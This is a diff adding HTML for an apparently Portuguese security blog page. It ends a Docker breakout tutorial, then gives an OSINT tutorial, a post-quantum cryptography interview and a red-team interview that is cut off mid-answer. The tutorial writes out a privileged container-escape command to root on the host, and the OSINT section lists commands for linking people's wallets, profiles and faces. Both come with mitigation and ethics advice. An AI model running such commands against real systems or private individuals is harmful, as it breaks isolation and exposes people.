+                                    <div class="step-title">Usar a API Docker para criar um container privilegiado</div>
+                                    <div class="step-content">
+                                        <p>Agora você pode usar o cliente Docker para criar um novo container com acesso completo ao host:</p>
+                                        <div class="command-example">docker run -it --privileged --pid=host --net=host --ipc=host -v /:/hostfs ubuntu:22.04 chroot /hostfs bash</div>
+                                        
+                                        <p>Este comando cria um container que:</p>
+                                        <ul>
+                                            <li>Tem privilégios completos <code>--privileged</code></li>
+                                            <li>Compartilha o namespace PID com o host <code>--pid=host</code></li>
+                                            <li>Usa a rede do host <code>--net=host</code></li>
+                                            <li>Monta o sistema de arquivos raiz do host em /hostfs</li>
+                                            <li>Usa chroot para efetivamente "se tornar" o host</li>
+                                        </ul>
+                                        
+                                        <p>Agora você está efetivamente executando como root no host, não mais dentro de um container.</p>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <h4>Mitigação e proteção</h4>
+                            <p>Para proteger seus ambientes Docker contra estas técnicas de breakout:</p>
+                            
+                            <ol>
+                                <li><strong>Nunca use o flag --privileged</strong> em ambientes de produção</li>
+                                <li><strong>Limite as capacidades do kernel</strong> usando <code>--cap-drop=ALL --cap-add=específica</code></li>
+                                <li><strong>Nunca monte o socket Docker</strong> dentro de containers não confiáveis</li>
+                                <li><strong>Use namespaces de usuário</strong> para mapear o usuário root do container para um usuário não privilegiado no host</li>
+                                <li><strong>Aplique políticas de AppArmor/SELinux</strong> para restringir o que containers podem fazer</li>
+                                <li><strong>Utilize ferramentas de segurança para containers</strong> como Falco, Aqua Security ou Sysdig para monitoramento e detecção</li>
+                            </ol>
+                            
+                            <div class="info-box">
+                                <i class="fas fa-info-circle"></i> <strong>Melhor prática:</strong> Sempre siga o princípio de privilégio mínimo. Dê aos containers apenas as permissões necessárias para executar suas funções legítimas e nada mais.
+                            </div>
+                            
+                            <h4>Conclusão</h4>
+                            <p>As técnicas de Docker Breakout demonstram por que a configuração adequada de segurança é crucial em ambientes containerizados. Embora containers ofereçam isolamento, eles não são projetados para ser uma barreira de segurança completa por si só.</p>
+                            
+                            <p>Profissionais de segurança devem entender estas técnicas para melhor proteger seus ambientes, e desenvolvedores precisam estar cientes dos riscos ao configurar containers com privilégios excessivos.</p>
+                            
+                            <div class="tags">
+                                <span class="tag">Docker</span>
+                                <span class="tag">Container</span>
+                                <span class="tag">Segurança</span>
+                                <span class="tag">Breakout</span>
+                                <span class="tag">Tutorial</span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="article-item">
+                        <div class="article-header">
+                            <span class="article-category">Tutoriais</span>
+                            <h3>OSINT avançado: Técnicas para investigações digitais em 2025</h3>
+                            <div class="article-meta">
+                                <span><i class="far fa-calendar"></i> 18/05/2025</span>
+                                <span><i class="far fa-user"></i> Admin</span>
+                                <span><i class="far fa-eye"></i> 4.219 visualizações</span>
+                            </div>
+                        </div>
+                        <div class="article-content">
+                            <p>OSINT (Open Source Intelligence) continua sendo uma das disciplinas mais importantes na segurança da informação e investigações digitais. Em 2025, com a evolução da web descentralizada, identidades digitais e privacidade, as técnicas de OSINT também evoluíram. Este tutorial apresenta métodos avançados para coleta e análise de informações públicas.</p>
+                            
+                            <div class="warning-box">
+                                <i class="fas fa-exclamation-triangle"></i> <strong>Nota ética:</strong> Estas técnicas devem ser utilizadas apenas para fins legítimos, como investigações de segurança autorizadas, pesquisas acadêmicas ou autoavaliação de exposição digital. Respeite sempre a privacidade e as leis aplicáveis.
+                            </div>
+                            
+                            <h4>1. Reconhecimento de infraestrutura moderna</h4>
+                            <p>O reconhecimento de infraestrutura evoluiu para incluir ambientes em nuvem, microserviços e infraestrutura como código.</p>
+                            
+                            <div class="tutorial-steps">
+                                <div class="tutorial-step">
+                                    <div class="step-title">Mapeamento de infraestrutura em nuvem</div>
+                                    <div class="step-content">
+                                        <p>Use ferramentas como CloudMapper e CloudSploit para descobrir recursos em nuvem:</p>
+                                        <div class="command-example">git clone https://github.com/duo-labs/cloudmapper.git
+cd cloudmapper
+./cloudmapper.py collect --account target</div>
+                                        
+                                        <p>Para APIs e endpoints públicos, utilize o GAPFinder:</p>
+                                        <div class="command-example">gapfinder -d exemplo.com -o output.json</div>
+                                        
+                                        <p>Esta ferramenta identifica endpoints de API públicos, documentação e estruturas potencialmente expostas.</p>
+                                    </div>
+                                </div>
+                                
+                                <div class="tutorial-step">
+                                    <div class="step-title">Análise de repositórios de código</div>
+                                    <div class="step-content">
+                                        <p>Ferramentas como Gitleaks e TruffleHog podem encontrar informações sensíveis em repositórios públicos:</p>
+                                        <div class="command-example">gitleaks detect --source=https://github.com/organização/repositório -v</div>
+                                        
+                                        <p>Para análise de histórico de commits e contribuidores:</p>
+                                        <div class="command-example">gittracker -r https://github.com/organização/repositório -a -t</div>
+                                        
+                                        <p>O GitTracker é uma nova ferramenta que rastreia padrões de contribuição e correlaciona identidades de desenvolvedores entre diferentes plataformas.</p>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <h4>2. Investigação de identidades descentralizadas</h4>
+                            <p>Com o crescimento da Web3 e identidades descentralizadas, novos métodos de OSINT surgiram.</p>
+                            
+                            <div class="tutorial-steps">
+                                <div class="tutorial-step">
+                                    <div class="step-title">Análise de endereços de carteiras blockchain</div>
+                                    <div class="step-content">
+                                        <p>Use ferramentas como Chainabuse e Wallet Explorer para investigar transações e conexões:</p>
+                                        <div class="command-example">walletxplorer -a 0x1234abcd... --graph --correlate</div>
+                                        
+                                        <p>Esta ferramenta cria um grafo visual de transações e tenta correlacionar múltiplas carteiras pertencentes à mesma entidade.</p>
+                                        
+                                        <p>Para análise de NFTs e tokens associados a identidades:</p>
+                                        <div class="command-example">nfttracker -a 0x1234abcd... -d -m</div>
+                                        
+                                        <p>O NFTTracker analisa metadados de NFTs, incluindo informações de criadores e imagens, correlacionando-os com identidades na web convencional.</p>
+                                    </div>
+                                </div>
+                                
+                                <div class="tutorial-step">
+                                    <div class="step-title">Correlação entre identidades Web2 e Web3</div>
+                                    <div class="step-content">
+                                        <p>O ENSInvestigator associa domínios ENS (Ethereum Name Service) com identidades tradicionais:</p>
+                                        <div class="command-example">ensinvestigator -n vitalik.eth --reverse --social</div>
+                                        
+                                        <p>Para análise de perfis descentralizados como Lens Protocol e Farcaster:</p>
+                                        <div class="command-example">decentralid -u user.lens -x --map-social</div>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <h4>3. Análise avançada de redes sociais</h4>
+                            <p>As redes sociais continuam sendo fontes valiosas de OSINT, mas as técnicas evoluíram significativamente.</p>
+                            
+                            <div class="tutorial-steps">
+                                <div class="tutorial-step">
+                                    <div class="step-title">Análise contextual de conteúdo</div>
+                                    <div class="step-content">
+                                        <p>O SocialContext usa análise semântica para extrair informações contextuais de postagens:</p>
+                                        <div class="command-example">socialcontext -u @username -p 100 --analyze --extract-entities</div>
+                                        
+                                        <p>Esta ferramenta identifica locais mencionados, pessoas, organizações, eventos e tópicos recorrentes, mesmo quando não explicitamente tagados.</p>
+                                    </div>
+                                </div>
+                                
+                                <div class="tutorial-step">
+                                    <div class="step-title">Análise visual e de metadados</div>
+                                    <div class="step-content">
+                                        <p>O ImageTracer extrai e analisa metadados de imagens, incluindo reconhecimento de locais:</p>
+                                        <div class="command-example">imagetracer -u @username --extract-all --geo-fence</div>
+                                        
+                                        <p>Para reconhecimento facial ético (apenas para identificar a mesma pessoa em diferentes contextos):</p>
+                                        <div class="command-example">facematch --reference profile.jpg --search-context "@username" --ethical-mode</div>
+                                        
+                                        <p>O modo ético limita o uso para correlação, não identificação, e requer confirmação explícita de uso legítimo.</p>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <h4>4. Ferramentas de automatização e correlação</h4>
+                            <p>Novas ferramentas permitem automatizar e correlacionar dados de múltiplas fontes.</p>
+                            
+                            <div class="tutorial-steps">
+                                <div class="tutorial-step">
+                                    <div class="step-title">Recon-NG avançado</div>
+                                    <div class="step-content">
+                                        <p>O Recon-NG recebeu atualizações significativas para 2025:</p>
+                                        <div class="command-example">recon-ng
+[recon-ng][default] > workspaces create investigação1
+[recon-ng][investigação1] > modules load recon/domains-all
+[recon-ng][investigação1] > options set SOURCE exemplo.com
+[recon-ng][investigação1] > run</div>
+                                        
+                                        <p>Novos módulos incluem:</p>
+                                        <ul>
+                                            <li><code>recon/web3-wallets</code> - Correlaciona domínios com carteiras web3</li>
+                                            <li><code>recon/apis-endpoints</code> - Descobre endpoints de API</li>
+                                            <li><code>recon/social-semantic</code> - Análise semântica de perfis sociais</li>
+                                        </ul>
+                                    </div>
+                                </div>
+                                
+                                <div class="tutorial-step">
+                                    <div class="step-title">SpiderFoot avançado</div>
+                                    <div class="step-content">
+                                        <p>O SpiderFoot HX 5.0 traz novos recursos:</p>
+                                        <div class="command-example">spiderfoot -l 127.0.0.1:5001</div>
+                                        
+                                        <p>Na interface web, crie uma nova varredura com os novos módulos:</p>
+                                        <ul>
+                                            <li><code>sfp_decentralid</code> - Identidades descentralizadas</li>
+                                            <li><code>sfp_cloudresources</code> - Recursos em nuvem</li>
+                                            <li><code>sfp_semanticanalyzer</code> - Análise semântica de conteúdo</li>
+                                        </ul>
+                                    </div>
+                                </div>
+                                
+                                <div class="tutorial-step">
+                                    <div class="step-title">Maltego Transforms avançados</div>
+                                    <div class="step-content">
+                                        <p>Novos Transforms para Maltego focados em ambientes modernos:</p>
+                                        <ul>
+                                            <li><code>BlockchainToIdentity</code> - Conecta endereços blockchain a identidades</li>
+                                            <li><code>APIEndpointDiscovery</code> - Mapeia APIs públicas</li>
+                                            <li><code>CloudResourceFinder</code> - Identifica recursos em nuvem</li>
+                                            <li><code>SemanticContentAnalyzer</code> - Analisa conteúdo de forma semântica</li>
+                                        </ul>
+                                        
+                                        <p>Exemplo de uso via CLI:</p>
+                                        <div class="command-example">maltego -run "BlockchainToIdentity.ETHToSocial" -params address=0x1234abcd...</div>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <h4>5. Avaliação e mitigação de exposição digital</h4>
+                            <p>Um componente importante do OSINT moderno é avaliar a própria exposição digital.</p>
+                            
+                            <div class="tutorial-steps">
+                                <div class="tutorial-step">
+                                    <div class="step-title">Autodiagnóstico de exposição</div>
+                                    <div class="step-content">
+                                        <p>O DigitalExposure Scanner avalia sua pegada digital:</p>
+                                        <div class="command-example">exposurescan -e email@exemplo.com -n "Nome Completo" --comprehensive</div>
+                                        
+                                        <p>Este comando executa verificações em bases de dados de vazamentos, redes sociais, registros públicos e repositórios de código.</p>
+                                    </div>
+                                </div>
+                                
+                                <div class="tutorial-step">
+                                    <div class="step-title">Remoção de informações expostas</div>
+                                    <div class="step-content">
+                                        <p>O DigitalCleanup identifica e ajuda a remover informações sensíveis:</p>
+                                        <div class="command-example">digitalcleanup -i exposure_report.json --generate-requests</div>
+                                        
+                                        <p>Este comando gera templates de solicitações de remoção para diferentes plataformas com base no relatório de exposição.</p>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <h4>Conclusão</h4>
+                            <p>As técnicas de OSINT continuam evoluindo junto com o panorama digital. Em 2025, a coleta e análise de informações públicas requer conhecimento de tecnologias descentralizadas, análise semântica avançada e correlação entre diferentes tipos de identidades digitais.</p>
+                            
+                            <p>Lembre-se sempre que o OSINT ético respeita a privacidade e os limites legais. O objetivo destas técnicas deve ser melhorar a segurança e a conscientização, não invadir a privacidade de indivíduos.</p>
+                            
+                            <div class="tags">
+                                <span class="tag">OSINT</span>
+                                <span class="tag">Investigação</span>
+                                <span class="tag">Web3</span>
+                                <span class="tag">Digital Footprint</span>
+                                <span class="tag">Técnicas avançadas</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="entrevistas" class="article-list">
+                    <h2 class="section-title">Entrevistas com Profissionais</h2>
+                    
+                    <div class="article-item">
+                        <div class="article-header">
+                            <span class="article-category">Entrevistas</span>
+                            <h3>Segurança Quântica: Preparando-se para o futuro da criptografia</h3>
+                            <div class="article-meta">
+                                <span><i class="far fa-calendar"></i> 15/05/2025</span>
+                                <span><i class="far fa-user"></i> Admin</span>
+                                <span><i class="far fa-eye"></i> 1.875 visualizações</span>
+                            </div>
+                        </div>
+                        <div class="article-content">
+                            <p>A computação quântica está se aproximando rapidamente do ponto em que poderá quebrar muitos dos algoritmos criptográficos atualmente em uso. Para entender melhor os desafios e soluções relacionados à segurança pós-quântica, entrevistamos a Dra. Mariana Santos, especialista em criptografia quântica e pesquisadora no Instituto de Tecnologia Quântica.</p>
+                            
+                            <div class="interview-box">
+                                <div class="interview-header">
+                                    <img src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?q=80&w=1976&auto=format&fit=crop" alt="Dra. Mariana Santos" class="interview-avatar">
+                                    <div class="interview-info">
+                                        <h4>Dra. Mariana Santos</h4>
+                                        <p>Especialista em Criptografia Quântica | Instituto de Tecnologia Quântica</p>
+                                    </div>
+                                </div>
+                                
+                                <div class="interview-question">
+                                    Em termos simples, qual é a real ameaça que a computação quântica representa para a segurança da informação atual?
+                                </div>
+                                <div class="interview-answer">
+                                    A maior ameaça vem do algoritmo de Shor, que permite que computadores quânticos suficientemente poderosos quebrem criptografia de chave pública baseada em fatoração de números primos (RSA) e logaritmos discretos (DSA, ECDSA). Em termos práticos, isso significa que muitos dos sistemas que protegem nossas comunicações, transações bancárias e identidades digitais se tornarão obsoletos.
+                                    
+                                    O que torna isso particularmente preocupante é o conceito de "harvest now, decrypt later". Adversários podem estar coletando dados criptografados hoje para descriptografá-los quando tiverem acesso a computadores quânticos no futuro. Para informações que precisam permanecer seguras por décadas, isso já é um problema real, não apenas teórico.
+                                </div>
+                                
+                                <div class="interview-question">
+                                    Quanto tempo temos até que computadores quânticos sejam capazes de quebrar a criptografia atual?
+                                </div>
+                                <div class="interview-answer">
+                                    Essa é a pergunta de um milhão de dólares! As estimativas variam muito. Há cinco anos, muitos pesquisadores falavam em 15-20 anos. Hoje, com os avanços acelerados, estamos olhando para um horizonte de 5-10 anos para um computador quântico capaz de quebrar RSA-2048.
+                                    
+                                    Mas é importante entender que não será um evento binário - não acordaremos um dia com toda a criptografia quebrada. Será um processo gradual, começando com algoritmos mais fracos ou chaves menores. E diferentes organizações enfrentarão diferentes níveis de risco: infraestruturas críticas e segredos de estado são alvos prioritários.
+                                    
+                                    A questão mais relevante não é exatamente "quando", mas "estamos preparados?". E atualmente, a maioria das organizações não está.
+                                </div>
+                                
+                                <div class="interview-question">
+                                    Quais são as soluções mais promissoras em termos de criptografia pós-quântica?
+                                </div>
+                                <div class="interview-answer">
+                                    O NIST está liderando o esforço de padronização de algoritmos pós-quânticos. Em 2022, eles selecionaram os primeiros algoritmos: CRYSTALS-Kyber para encriptação de chave pública e estabelecimento de chaves, e CRYSTALS-Dilithium, FALCON e SPHINCS+ para assinaturas digitais.
+                                    
+                                    CRYSTALS-Kyber é baseado em reticulados, que são estruturas matemáticas complexas que parecem resistir a ataques quânticos. Sua grande vantagem é a eficiência - chaves e cifertextos são relativamente pequenos.
+                                    
+                                    Também temos algoritmos baseados em códigos, hash, e isogenias, cada um com diferentes compromissos entre segurança, tamanho e desempenho. A diversidade é importante, pois queremos evitar ter um único ponto de falha.
+                                    
+                                    Além da criptografia pós-quântica clássica, a distribuição quântica de chaves (QKD) é uma solução complementar que usa princípios da mecânica quântica para comunicação intrinsecamente segura. No entanto, QKD requer hardware especializado e tem limitações práticas que restringem seu uso a cenários específicos.
+                                </div>
+                                
+                                <div class="interview-question">
+                                    Que passos práticos as organizações deveriam estar tomando agora para se preparar?
+                                </div>
+                                <div class="interview-answer">
+                                    Primeiro, inventário criptográfico. As organizações precisam saber onde e como usam criptografia - algo que muitas não sabem completamente. Isso inclui não apenas sistemas internos, mas também fornecedores e dependências.
+                                    
+                                    Segundo, implementar "agilidade criptográfica" - a capacidade de mudar algoritmos rapidamente. Sistemas legados frequentemente têm algoritmos criptográficos codificados rigidamente, tornando as atualizações difíceis.
+                                    
+                                    Terceiro, começar a implementar criptografia híbrida - usando tanto algoritmos clássicos quanto pós-quânticos juntos. Isso proporciona proteção contra ameaças quânticas enquanto mantém a compatibilidade com sistemas existentes.
+                                    
+                                    Quarto, participar de testes e pilotos. Várias organizações como o Internet Engineering Task Force estão conduzindo experimentos com protocolos pós-quânticos.
+                                    
+                                    Finalmente, educação. A mudança para criptografia pós-quântica requer conscientização em todos os níveis da organização, desde desenvolvedores até executivos.
+                                </div>
+                                
+                                <div class="interview-question">
+                                    Há algum setor específico que deveria estar particularmente preocupado?
+                                </div>
+                                <div class="interview-answer">
+                                    Absolutamente. Setores com informações de longo prazo sensíveis estão no topo da lista: saúde, finanças, defesa, governos e infraestrutura crítica. Pense em dados médicos que precisam permanecer confidenciais por décadas, ou segredos militares que mantêm valor por gerações.
+                                    
+                                    O setor financeiro, especialmente criptomoedas e blockchain, também enfrenta desafios significativos. A maioria das blockchains usa criptografia de curva elíptica que é vulnerável a ataques quânticos. Embora algumas criptomoedas estejam desenvolvendo soluções pós-quânticas, a maioria ainda não implementou proteções robustas.
+                                    
+                                    A indústria automotiva é outro exemplo interessante. Carros modernos contêm dezenas de computadores e chaves criptográficas, e têm ciclos de vida de 15-20 anos. Um carro fabricado hoje pode ainda estar na estrada quando computadores quânticos poderosos estiverem disponíveis.
+                                </div>
+                                
+                                <div class="interview-question">
+                                    Existe algum aspecto da segurança quântica que você sente que não está recebendo atenção suficiente?
+                                </div>
+                                <div class="interview-answer">
+                                    Sim, a governança e os aspectos humanos. Muitas discussões focam na matemática e nos algoritmos, mas ignoram desafios práticos de implementação. Mesmo com algoritmos perfeitos, teremos vulnerabilidades se a implementação for falha.
+                                    
+                                    Outro aspecto subestimado é o impacto em países e comunidades com menos recursos. A transição para criptografia pós-quântica exigirá investimentos significativos e expertise técnica. Existe o risco real de criar uma divisão digital quântica, onde apenas países e empresas ricas podem se proteger adequadamente.
+                                    
+                                    Também vale mencionar o gerenciamento de identidade quântica. Nossos sistemas atuais de identidade digital dependem fortemente de assinaturas digitais vulneráveis a ataques quânticos. Precisamos de novos paradigmas para identidade na era pós-quântica.
+                                    
+                                    Finalmente, precisamos considerar a segurança quântica holística. Não se trata apenas de substituir algoritmos, mas de repensar arquiteturas de segurança inteiras para a era quântica.
+                                </div>
+                                
+                                <div class="interview-question">
+                                    Para finalizar, qual conselho você daria a profissionais de segurança da informação que estão começando a se preocupar com a segurança quântica?
+                                </div>
+                                <div class="interview-answer">
+                                    Comece a se educar agora. Você não precisa se tornar um especialista em física quântica, mas entenda os princípios básicos da criptografia pós-quântica e como ela difere da criptografia clássica.
+                                    
+                                    Adote uma mentalidade de resiliência quântica. Não é apenas sobre trocar um algoritmo por outro, mas sobre construir sistemas que possam evoluir com as ameaças.
+                                    
+                                    Participe da comunidade. Junte-se a grupos de trabalho, teste implementações, compartilhe experiências. Esta é uma transição que afeta toda a indústria, e precisamos colaborar.
+                                    
+                                    E mais importante: comece hoje. A migração para sistemas pós-quânticos levará anos, especialmente para organizações complexas. O tempo para agir é agora, não quando os primeiros computadores quânticos práticos já estiverem quebrando códigos.
+                                    
+                                    Lembre-se que estamos no meio de uma das transições mais fundamentais na história da segurança da informação. É um desafio, mas também uma oportunidade incrível para construir sistemas mais seguros para o futuro.
+                                </div>
+                            </div>
+                            
+                            <div class="tags">
+                                <span class="tag">Criptografia</span>
+                                <span class="tag">Quântica</span>
+                                <span class="tag">Entrevista</span>
+                                <span class="tag">Segurança</span>
+                                <span class="tag">Futuro</span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="article-item">
+                        <div class="article-header">
+                            <span class="article-category">Entrevistas</span>
+                            <h3>Depoimento de um hacker ético: os bastidores de um Red Team profissional</h3>
+                            <div class="article-meta">
+                                <span><i class="far fa-calendar"></i> 10/05/2025</span>
+                                <span><i class="far fa-user"></i> Admin</span>
+                                <span><i class="far fa-eye"></i> 3.541 visualizações</span>
+                            </div>
+                        </div>
+                        <div class="article-content">
+                            <p>O trabalho de um Red Team profissional - equipes que realizam testes ofensivos de segurança simulando ataques reais - é frequentemente envolvido em mistério. Para entender melhor o dia a dia desses profissionais, conversamos com Carlos Mendes, líder de Red Team com mais de 15 anos de experiência em testes de penetração e simulações avançadas de ameaças.</p>
+                            
+                            <div class="interview-box">
+                                <div class="interview-header">
+                                    <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?q=80&w=1974&auto=format&fit=crop" alt="Carlos Mendes" class="interview-avatar">
+                                    <div class="interview-info">
+                                        <h4>Carlos Mendes</h4>
+                                        <p>Líder de Red Team | Especialista em Segurança Ofensiva</p>
+                                    </div>
+                                </div>
+                                
+                                <div class="interview-question">
+                                    Como você começou na área de segurança ofensiva e qual foi seu caminho até se tornar líder de Red Team?
+                                </div>
+                                <div class="interview-answer">
+                                    Minha jornada começou como muitos na minha geração: curiosidade e experimentação. Nos anos 2000, comecei modificando jogos e explorando redes, sempre com aquela paixão por entender como as coisas funcionam por dentro. Oficialmente, entrei na área como administrador de redes, onde percebi que entendia mais sobre as vulnerabilidades do que sobre as práticas recomendadas de configuração (risos).
+                                    
+                                    Depois de algumas certificações (OSCP foi a primeira grande), entrei em uma consultoria de segurança como pentester junior. Passei cinco anos fazendo testes tradicionais de penetração - web, rede, mobile, um pouco de tudo. Foi uma excelente base técnica, mas comecei a sentir que esses testes tinham limitações, principalmente em termos de realismo.
+                                    
+                                    A virada aconteceu quando participei de um Red Team contratado para testar uma instituição financeira. Ver como uma equipe coordenada poderia simular campanhas realistas de ameaças persistentes avançadas (APTs) mudou minha perspectiva. Logo depois, busquei me especializar em operações de Red Team, primeiro como operador e depois liderando equipes.
+                                    
+                                    O caminho não foi linear - envolveu muito autoestudo, certificações (CRTO, OSEP, CARTP), conferências, e principalmente, aprender com erros em engajamentos reais. Hoje lidero um time com especialistas em diferentes áreas: engenharia social, exploração de infraestrutura, desenvolvimento de malware personalizado, evasão de defesas.
+                                </div>
+                                
+                                <div class="interview-question">
+                                    Quais são as principais diferenças entre um teste de penetração tradicional e uma operação de Red Team?
+                                </div>
+                                <div class="interview-answer">
+                                    Essa é uma distinção importante! Pentest e Red Team têm objetivos e metodologias fundamentalmente diferentes, embora usem ferramentas similares.
+                                    
+                                    Um pentest é essencialmente um exercício técnico para identificar vulnerabilidades em sistemas específicos. É limitado no tempo e escopo, geralmente anunciado para a equipe de TI, e foca em encontrar o máximo de vulnerabilidades possíveis. Pense nisso como uma inspeção técnica, como verificar se todas as fechaduras da sua casa funcionam.
+                                    
+                                    Já uma operação de Red Team é uma simulação de adversário. Temos objetivos específicos baseados em ameaças reais, sem restrições rígidas de escopo, e normalmente apenas um pequeno círculo dentro da organização sabe que o teste está acontecendo. Duramos semanas ou meses, não dias, e nosso foco não é encontrar todas as vulnerabilidades, mas sim demonstrar o impacto de um ataque real.
+                                    
+                                    Para usar a analogia da casa: em vez de verificar todas as fechaduras, o Red Team é contratado para tentar entrar na casa e alcançar um objetivo específico (como acessar o cofre) usando qualquer meio necessário - seja explorando uma fechadura quebrada, uma janela aberta, enganando um morador, ou uma combinação de táticas.
+                                    
+                                    Outra diferença fundamental é que o Red Team testa tanto sistemas técnicos quanto processos, pessoas e detecções. Queremos saber não apenas se podemos comprometer sistemas, mas se seremos detectados no processo. Isso torna o exercício muito mais valioso para avaliar a postura de segurança holística da organização.
+                                </div>
+                                
+                                <div class="interview-question">
+                                    Poderia compartilhar alguma história particularmente interessante de um engajamento de Red Team, obviamente sem comprometer informações confidenciais?
+                                </div>
+                                <div class="interview-answer">
+                                    Tenho várias! Uma das mais memoráveis foi em uma grande empresa de tecnologia com um programa de segurança bastante maduro. Nosso objetivo era acessar dados sensíveis de desenvolvimento de produtos, simulando um competidor determinado.
+                                    
+                                    Após duas semanas de reconhecimento, identificamos um evento de recrutamento que a empresa estava patrocinando em uma universidade. Criamos uma identidade falsa como recrutador de uma startup (com site, perfis de LinkedIn e tudo mais), e conseguimos um espaço no evento.
+                                    
+                                    Durante o evento, distribuímos drives USB "promocionais" com o logotipo da nossa startup falsa. Esses drives continham um malware sofisticado que estabelecia uma conexão reversa quando conectado. O detalhe interessante é que não visamos os estudantes, mas sim os funcionários da empresa alvo que estavam recrutando - sabíamos que eles provavelmente conectariam os drives quando voltassem ao escritório.
+                                    
+                                    Três dias depois, recebemos uma conexão. Um dos recrutadores conectou o drive a seu laptop corporativo. Apesar de terem proteções contra dispositivos USB, nosso malware explorou uma falha específica em seu software de gerenciamento de dispositivos que permitiu contornar essas proteções.
+                                    
+                                    A partir desse acesso inicial, mapeamos a rede interna, realizamos movimentação lateral e, eventualmente, chegamos a um servidor de desenvolvimento com os dados alvo. O mais interessante? A equipe de segurança detectou nossas atividades iniciais, mas nos classificou incorretamente como um falso positivo porque estávamos intencionalmente imitando o comportamento de uma ferramenta de TI legítima.
+                                    
+                                    O cliente ficou impressionado não apenas com nossa capacidade de atingir o objetivo, mas principalmente com nossa metodologia realista. Este engajamento levou a melhorias significativas no programa de conscientização sobre engenharia social e nos processos de triagem de alertas de segurança.
+                                </div>
+                                
+                                <div class="interview-question">
+                                    Quais são as habilidades mais importantes para um profissional de Red Team hoje?
+                                </div>
+                                <div class="interview-answer">
+                                    As habilidades técnicas são o básico - você precisa entender profundamente redes, sistemas operacionais, aplicações web, cloud, etc. Mas o que realmente diferencia um operador de Red Team excepcional são as "meta-habilidades".
+                                    
+                                    Primeiro, pensamento adaptativo. Diferente de um pentester que segue uma metodologia relativamente estruturada, um operador de Red Team frequentemente precisa improvisar quando defesas inesperadas são encontradas. Você precisa pensar como um adversário real, adaptando-se constantemente.
+                                    
+                                    Segundo, evasão de defesas. Não basta saber explorar vulnerabilidades; você precisa fazê-lo de maneira que evite detecção. Isso requer conhecimento profundo de como ferramentas de segurança como EDRs, SIEMs, e DLPs funcionam, e como contorná-las.
+                                    
+                                    Terceiro, comunicação. Surpreendentemente, muitos profissionais técnicos subestimam isso. Um relatório de Red Team não é apenas uma lista de vulnerabilidades - é uma narrativa que demonstra impacto de negócio real. Você precisa traduzir descobertas técnicas em riscos que executivos possam entender.
+                                    
+                                    Quarto, OSINT e inteligência de ameaças. Você precisa entender quem são os adversários reais que visariam seu cliente, como eles operam, quais TTPs eles utilizam. Red Teams eficazes emulam ameaças específicas e realistas.
+                                    
+                                    Por último, ética e julgamento. Temos acesso a sistemas críticos e informações sensíveis. Saber onde traçar a linha, especialmente em engenharia social, é crucial. Um teste que traumatiza funcionários ou causa danos operacionais falhou, independentemente de ter atingido objetivos técnicos.
+                                </div>
+                                
+                                <div class="interview-question">
+                                    Quais tendências você está observando em defesas corporativas, e como isso está mudando as táticas de Red Team?
+                                </div>
+                                <div class="interview-answer">
+                                    O cenário está mudando rapidamente. Há cinco anos, conseguir acesso inicial e estabelecer persistência era relativamente fácil na maioria das organizações. Hoje, com soluções de EDR (Endpoint Detection and Response) avançadas, microsegmentação, e Zero Trust, o jogo mudou significativamente.
+                                    
+                                    As maiores mudanças que estou vendo:
+                                    
+                                    Primeiro, a era dos malwares baseados em arquivos está acabando em ambientes corporativos bem protegidos. Estamos usando cada vez mais técnicas "living off the land" (usando ferramentas legítimas do sistema) e ataques sem arquivo (fileless). Frameworks como Cobalt Strike estão cada vez mais detectáveis, então estamos desenvolvendo ferramentas personalizadas para cada engajamento.
+                                    
+                                    Segundo, a adoção em massa de ferramentas de XDR (Extended Detection and Response) significa que mesmo que você comprometa um endpoint, ser detectado durante movimentação lateral é muito mais provável. Isso nos forçou a ser muito mais lentos e metodológicos - às vezes esperamos dias entre ações para evitar detecção.
+                                    
+                                    Terceiro, a mudança para nuvem e SaaS criou novos vetores. Estamos focando muito mais em abuso de configurações, token theft, e exploitation de cadeias de identidade em vez de exploits tradicionais. Comprometer uma identidade na nuvem frequentemente dá mais acesso do que um servidor local comprometido.
+                                    
+                                    Quarto, a engenharia social evoluiu. Phishing simples não funciona mais contra organizações bem treinadas. Estamos usando campanhas multicamadas que combinam telefone, email, SMS e até mesmo aproximação física (quando permitido pelo escopo).
+                                    
+                                    Por fim, estou vendo uma mudança filosófica de "prevenção a todo custo" para "assumir comprometimento". As organizações estão investindo mais em detecção e resposta, assumindo que prevenção eventualmente falhará. Isso significa que nossos Red Teams estão cada vez mais avaliando não apenas se podemos comprometer um alvo, mas quanto tempo leva até sermos detectados e contidos.
+                                </div>
+                                
+                                <div class="interview-question">
+                                    Qual conselho você daria para alguém que está começando na carreira e quer eventualmente trabalhar com Red Team?
+                                </div>
+                                <div class="interview-answer">
+                                    Construa uma base sólida primeiro. Muitas pessoas querem pular direto para o trabalho "sexy" de Red Team, mas sem entender profundamente as tecnologias que você está atacando, você será apenas um "operador de ferramenta" e não um verdadeiro Red Teamer.
+                                    
+                                    Recomendo começar com funções de defesa ou pentest tradicional. Trabalhar como administrador de sistemas, engenheiro de redes, ou desenvolvedor dá uma compreensão inestimável de como sistemas funcionam. Experiência em Blue Team (defesa) é particularmente valiosa - os melhores atacantes entendem como os defensores pensam.
+                                    
+                                    Em termos de aprendizado, crie um laboratório em casa. Ferramentas como Proxmox, VMware, ou plataformas de nuvem permitem criar ambientes complexos para praticar. Participe de CTFs (Capture The Flag) e plataformas como HackTheBox e TryHackMe. Documentar o que você aprende em um blog técnico demonstra conhecimento e ajuda a construir reputação.
+                                    
+                                    Para certificações, comece com fundamentais como OSCP, e depois avance para especializadas como CRTO (Certified Red Team Operator) ou OSEP. Mas lembre-se que certificações mostram apenas um baseline - seus projetos pessoais e contribuições para a comunidade frequentemente importam mais.
+                                    
+                                    Finalmente, desenvolva soft skills. Comunicação clara, escrita técnica, e até mesmo habilidades sociais para engenharia social são cruciais. Red Team é um trabalho técnico, mas também profundamente humano - entender psicologia e comportamento organizacional é tão importante quanto conhecer a última técnica de evasão de EDR.
+                                    
